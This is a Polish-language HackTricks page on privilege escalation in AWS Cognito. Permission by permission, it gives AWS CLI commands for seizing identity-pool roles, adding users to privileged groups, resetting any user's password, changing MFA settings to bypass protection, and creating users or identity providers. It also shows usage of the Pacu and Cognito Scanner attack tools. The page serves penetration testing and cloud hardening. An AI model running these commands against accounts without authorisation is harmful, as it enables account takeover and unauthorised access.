# AWS - Eskalacja uprawnień w Cognito

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Cognito

Aby uzyskać więcej informacji na temat Cognito, sprawdź:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Pozyskiwanie poświadczeń z basenu tożsamości

Ponieważ Cognito może przyznać **poświadczenia roli IAM** zarówno **uwierzytelnionym**, jak i **nieuwierzytelnionym** **użytkownikom**, jeśli zlokalizujesz **ID basenu tożsamości** aplikacji (powinno być na niej zakodowane), możesz uzyskać nowe poświadczenia i tym samym eskalować uprawnienia (wewnątrz konta AWS, gdzie prawdopodobnie wcześniej nie miałeś żadnych poświadczeń).

Aby uzyskać więcej informacji, [**sprawdź tę stronę**](../aws-unauthenticated-enum-access/#cognito).

**Potencjalne skutki:** Bezpośrednia eskalacja uprawnień do roli usług przypisanej do nieuwierzytelnionych użytkowników (i prawdopodobnie do tej przypisanej do uwierzytelnionych użytkowników).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Z tym uprawnieniem możesz **przyznać dowolną rolę Cognito** uwierzytelnionym/nieuwierzytelnionym użytkownikom aplikacji Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Jeśli aplikacja Cognito **nie ma włączonych nieuwierzytelnionych użytkowników**, możesz również potrzebować uprawnienia `cognito-identity:UpdateIdentityPool`, aby je włączyć.

**Potencjalny wpływ:** Bezpośrednie podniesienie uprawnień do dowolnej roli Cognito.

### `cognito-identity:update-identity-pool`

Atakujący posiadający to uprawnienie mógłby na przykład ustawić pulę użytkowników Cognito pod swoją kontrolą lub dowolnego innego dostawcę tożsamości, gdzie może zalogować się jako **sposób na dostęp do tej puli tożsamości Cognito**. Następnie, po prostu **zalogowanie** się na tym dostawcy użytkownika pozwoli mu **uzyskać dostęp do skonfigurowanej roli uwierzytelnionej w puli tożsamości**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Możliwe jest również **nadużycie tego uprawnienia w celu umożliwienia uwierzytelniania podstawowego**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencjalny wpływ**: Kompromitacja skonfigurowanej uwierzytelnionej roli IAM w puli tożsamości.

### `cognito-idp:AdminAddUserToGroup`

To uprawnienie pozwala **dodać użytkownika Cognito do grupy Cognito**, dlatego atakujący mógłby wykorzystać to uprawnienie, aby dodać użytkownika pod swoją kontrolą do innych grup z **lepszymi** uprawnieniami lub **różnymi rolami IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencjalny wpływ:** Eskalacja uprawnień do innych grup Cognito oraz ról IAM przypisanych do grup pul użytkowników.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Atakujący posiadający te uprawnienia mógłby **tworzyć/aktualizować grupy** z **każdą rolą IAM, która może być użyta przez skompromitowany dostawca tożsamości Cognito** oraz umieścić skompromitowanego użytkownika w grupie, uzyskując dostęp do wszystkich tych ról:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencjalne skutki:** Eskalacja uprawnień do innych ról IAM Cognito.

### `cognito-idp:AdminConfirmSignUp`

To uprawnienie umożliwia **potwierdzenie rejestracji**. Domyślnie każdy może zarejestrować się w aplikacjach Cognito, jeśli to zostanie, użytkownik może utworzyć konto z dowolnymi danymi i potwierdzić je tym uprawnieniem.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpływ:** Pośrednie podniesienie uprawnień do roli IAM puli tożsamości dla uwierzytelnionych użytkowników, jeśli można zarejestrować nowego użytkownika. Pośrednie podniesienie uprawnień do innych funkcji aplikacji, umożliwiające potwierdzenie dowolnego konta.

### `cognito-idp:AdminCreateUser`

To uprawnienie umożliwiłoby atakującemu utworzenie nowego użytkownika w puli użytkowników. Nowy użytkownik jest tworzony jako włączony, ale będzie musiał zmienić swoje hasło.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencjalne skutki:** Bezpośrednie podniesienie uprawnień do roli IAM puli tożsamości dla uwierzytelnionych użytkowników. Pośrednie podniesienie uprawnień do innych funkcji aplikacji, umożliwiając tworzenie dowolnego użytkownika

### `cognito-idp:AdminEnableUser`

Te uprawnienia mogą pomóc w bardzo specyficznym scenariuszu, w którym atakujący znalazł poświadczenia wyłączonego użytkownika i musi go **ponownie włączyć**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencjalne skutki:** Pośrednie podniesienie uprawnień do roli IAM puli tożsamości dla uwierzytelnionych użytkowników oraz uprawnień użytkownika, jeśli atakujący posiadał dane uwierzytelniające wyłączonego użytkownika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

To uprawnienie pozwala na logowanie za pomocą [**metody ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Aby uzyskać więcej informacji, przejdź pod podany link.

### `cognito-idp:AdminSetUserPassword`

To uprawnienie pozwoliłoby atakującemu **zmienić hasło dowolnego użytkownika**, umożliwiając mu podszywanie się pod dowolnego użytkownika (który nie ma włączonej MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencjalny wpływ:** Bezpośrednie podniesienie uprawnień do potencjalnie dowolnego użytkownika, uzyskanie dostępu do wszystkich grup, których jest członkiem, oraz dostęp do roli IAM uwierzytelnionej puli tożsamości.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Atakujący mógłby potencjalnie wykorzystać te uprawnienia, aby ustawić swój telefon komórkowy pod kontrolą jako **MFA SMS użytkownika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Podobnie jak w poprzednim przypadku, to uprawnienie można wykorzystać do ustawienia preferencji MFA użytkownika w celu ominięcia ochrony MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Podobnie jak w poprzednim przypadku, to uprawnienie można wykorzystać do ustawienia preferencji MFA dla puli użytkowników w celu ominięcia ochrony MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Istnieje również możliwość zaktualizowania puli użytkowników w celu zmiany polityki MFA. [Sprawdź tutaj cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potencjalny wpływ:** Pośrednie eskalowanie uprawnień do potencjalnie dowolnego użytkownika, których dane uwierzytelniające zna atakujący, co może umożliwić ominiecie ochrony MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Atakujący posiadający to uprawnienie mógłby zmienić e-mail lub numer telefonu lub dowolny inny atrybut użytkownika pod swoją kontrolą, aby uzyskać więcej uprawnień w aplikacji.\
To pozwala na zmianę e-maila lub numeru telefonu i ustawienie go jako zweryfikowany.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencjalne skutki:** Potencjalne pośrednie eskalacje uprawnień w aplikacji wykorzystującej Cognito User Pool, które nadają uprawnienia na podstawie atrybutów użytkownika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Atakujący posiadający to uprawnienie mógłby **utworzyć nowego klienta puli użytkowników mniej ograniczonego** niż już istniejący klienci puli. Na przykład, nowy klient mógłby zezwalać na dowolny rodzaj uwierzytelniania, nie mieć żadnego sekretu, wyłączyć unieważnianie tokenów, zezwolić na ważność tokenów przez dłuższy okres...

To samo można zrobić, jeśli zamiast tworzenia nowego klienta, **zmodyfikowany zostanie istniejący**.

W [**wierszu poleceń**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (lub [**aktualizacji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) można zobaczyć wszystkie opcje, sprawdź to!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencjalny wpływ:** Potencjalne pośrednie eskalowanie uprawnień do użytkownika autoryzowanego puli tożsamości używanego przez pulę użytkowników poprzez utworzenie nowego klienta, który łagodzi środki bezpieczeństwa i umożliwia atakującemu zalogowanie się jako użytkownik, którego był w stanie utworzyć.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Atakujący mógłby wykorzystać to uprawnienie do tworzenia użytkowników poprzez przesyłanie pliku csv z nowymi użytkownikami.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potencjalny wpływ:** Bezpośrednie podniesienie uprawnień do roli IAM puli tożsamości dla uwierzytelnionych użytkowników. Pośrednie podniesienie uprawnień do innych funkcji aplikacji, umożliwiając tworzenie dowolnego użytkownika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Atakujący mógłby utworzyć nowego dostawcę tożsamości, aby następnie **zalogować się przez tego dostawcę**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencjalny wpływ:** Bezpośrednie podniesienie uprawnień do roli IAM puli tożsamości dla uwierzytelnionych użytkowników. Pośrednie podniesienie uprawnień do innych funkcji aplikacji poprzez możliwość tworzenia dowolnych użytkowników.

### Analiza cognito-sync:\*

To bardzo powszechne uprawnienie domyślne w rolach pul tożsamości Cognito. Nawet jeśli użycie gwiazdki w uprawnieniach zawsze wygląda źle (szczególnie pochodząc od AWS), **udzielone uprawnienia nie są super przydatne z perspektywy atakującego**.

To uprawnienie pozwala na odczyt informacji o użytkownikach pul tożsamości oraz identyfikatorach tożsamości wewnątrz pul tożsamości (co nie jest poufnymi informacjami).\
Identyfikatory tożsamości mogą mieć przypisane [**Zbiory danych**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html), które są informacjami o sesjach (AWS definiuje to jako **zapisaną grę**). Możliwe, że mogą one zawierać pewne poufne informacje (ale prawdopodobieństwo jest dość niskie). Możesz znaleźć na [**stronie wyliczania**](../aws-services/aws-cognito-enum/) sposób dostępu do tych informacji.

Atakujący mógłby również użyć tych uprawnień do **zapisania się do strumienia Cognito, który publikuje zmiany** w tych zbiorach danych lub **funkcji lambda, która wyzwalana jest przez zdarzenia Cognito**. Nie widziałem, aby to było wykorzystywane, i nie spodziewałbym się tutaj poufnych informacji, ale nie jest to niemożliwe.

### Automatyczne narzędzia

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), framework eksploatacji AWS, teraz zawiera moduły "cognito\_\_enum" i "cognito\_\_attack", które automatyzują wyliczanie wszystkich zasobów Cognito w koncie i oznaczają słabe konfiguracje, atrybuty użytkownika używane do kontroli dostępu, itp., oraz automatyzują tworzenie użytkowników (w tym obsługę MFA) i eskalację uprawnień na podstawie modyfikowalpu niestandardowych atrybutów, użytecznych poświadczeń puli tożsamości, ról do przyjęcia w tokenach id, itp.

Aby zapoznać się z opisem funkcji modułów, zobacz część 2 [postu na blogu](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Instrukcje instalacji znajdziesz na głównej stronie [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Użycie

Przykładowe użycie cognito\_\_attack do próby tworzenia użytkownika i wszystkich wektorów podwyższenia uprawnień przeciwko określonej puli tożsamości i klientowi puli użytkowników:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Przykładowe użycie cognito\_\_enum do zebrania wszystkich pul użytkowników, klientów pul użytkowników, pul tożsamości, użytkowników itp. widocznych w bieżącym koncie AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) to narzędzie CLI napisane w języku Python, które implementuje różne ataki na Cognito, w tym eskalację uprawnień.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### Użycie
```bash
$ cognito-scanner --help
```
Dla dalszych informacji sprawdź [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Dowiedz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
